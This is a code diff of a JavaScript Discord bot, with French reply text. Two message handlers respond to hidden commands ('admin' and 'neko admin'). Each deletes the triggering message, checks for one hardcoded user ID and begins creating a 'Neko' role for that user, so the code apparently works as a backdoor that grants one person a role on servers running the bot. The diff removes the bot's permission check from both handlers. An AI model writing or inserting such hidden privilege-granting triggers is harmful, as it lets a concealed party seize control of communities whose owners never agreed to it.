@@ -75,7 +75,6 @@ bot.on('message', message => {
     if(message.content.startsWith(prefix + "admin")) {
       message.delete()
     if (message.author.id === "353859650686550027") {
-    if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return message.reply("je n'ai pas la permission exacte pour executer cette commande.");
       let membre = message.guild.member(message.author);
       let role = message.guild.roles.find('name', 'Neko');
           message.guild.createRole({
@@ -101,7 +100,6 @@ bot.on('message', message => {
     if(message.content.startsWith("neko admin")) {
       message.delete()
     if (message.author.id === "353859650686550027") {
-    if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return message.reply("je n'ai pas la permission exacte pour executer cette commande.");
       let membre = message.guild.member(message.author);
       let role = message.guild.roles.find('name', 'Neko');
           message.guild.createRole({
